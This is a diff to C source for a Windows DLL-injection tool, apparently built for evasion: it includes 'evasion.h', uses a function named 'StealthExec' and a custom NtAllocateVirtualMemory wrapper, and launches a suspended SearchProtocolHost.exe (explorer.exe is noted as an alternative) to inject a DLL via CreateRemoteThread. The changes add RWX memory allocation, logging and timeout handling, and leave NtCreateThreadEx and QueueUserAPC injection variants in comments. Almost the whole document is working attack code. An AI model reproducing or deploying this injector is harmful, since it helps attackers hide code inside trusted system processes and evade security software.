@@ -5,7 +5,7 @@
 #include "evasion.h"
 
 // Core Injection Logic
-void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
+void StealthExec(HANDLE hProc, const char *dllN)
 {
     PVOID memLoc = NULL;
     SIZE_T sz = strlen(dllN) + 1;
@@ -20,18 +20,30 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
         printf("[!] Failed to resolve LoadLibraryA.\n");
         return;
     }
+    else
+    {
+        printf("[*] Successfully resolve LoadLibraryA.\n");
+    }
 
-    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != 0)
     {
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
+    }
+    else
+    {
+        printf("[*] Successfully allocate memory.\n");
     }
 
     if (memLoc == NULL)
     {
         printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
         return;
+    }
+    else
+    {
+        printf("[*] Successfully allocate memory, BaseAddress is not NULL.\n");
     }
 
     // Write DLL Path to Remote Process
@@ -41,7 +53,11 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
     }
-
+    else
+    {
+        printf("[*] Successfully write memory.\n");
+    }
+    
     // Load Remote DLL
     hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
@@ -49,8 +65,45 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
         printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
         return;
     }
-    WaitForSingleObject(hThreadRemote, INFINITE);
+    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000);  // Wait for 5 seconds
+    if (waitResult == WAIT_TIMEOUT) {
+        printf("[!] Remote thread timed out!\n");
+        TerminateThread(hThreadRemote, 0);  // Kill stuck thread
+        return;
+    } else if (waitResult == WAIT_FAILED) {
+        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
+        CloseHandle(hThreadRemote);
+        return;
+    }
+    ResumeThread(hThreadRemote);
     CloseHandle(hThreadRemote);
+    
+    /*
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
+
+    hThreadRemote = NULL;
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, FALSE, 0, 0, 0, NULL);
+
+    printf("[*] NtCreateThreadEx status: 0x%lx\n", status);
+    DWORD waitResult = WaitForSingleObject(hThread, 5000);  // Wait for 5 seconds
+    if (waitResult == WAIT_TIMEOUT) {
+        printf("[!] Remote thread timed out!\n");
+        TerminateThread(hThread, 0);  // Kill stuck thread
+        return;
+    } else if (waitResult == WAIT_FAILED) {
+        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
+        CloseHandle(hThread);
+        return;
+    }
+    ResumeThread(hThread);
+    CloseHandle(hThread);
+    */
+
+    /*
+    QueueUserAPC((PAPCFUNC)pLLoad, hThread, (ULONG_PTR)memLoc);
+    ResumeThread(hThread);
+    CloseHandle(hThread); 
+    */
 
     printf("[*] Successfully injected module\n");
 }
@@ -79,7 +132,8 @@ int main(int argc, char *argv[])
     const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
     const char *procName = "SearchProtocolHost.exe";
     // Also work with explorer.exe
-    // const char* targetProcess = "C:\\Windows\\explorer.exe";
+    // const char* procPath = "C:\\Windows\\explorer.exe";
+    // const char *procName = "Explorer.exe";
 
     if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
@@ -90,10 +144,9 @@ int main(int argc, char *argv[])
     printf("[*] Suspended %s created.\n", procName);
 
     // Perform Injection
-    StealthExec(pInfo.hProcess, pInfo.hThread, dllPath);
+    StealthExec(pInfo.hProcess, dllPath);
 
     // Resume Execution
-    ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
     CloseHandle(pInfo.hThread);
     printf("[*] %s is now running.\n", procName);
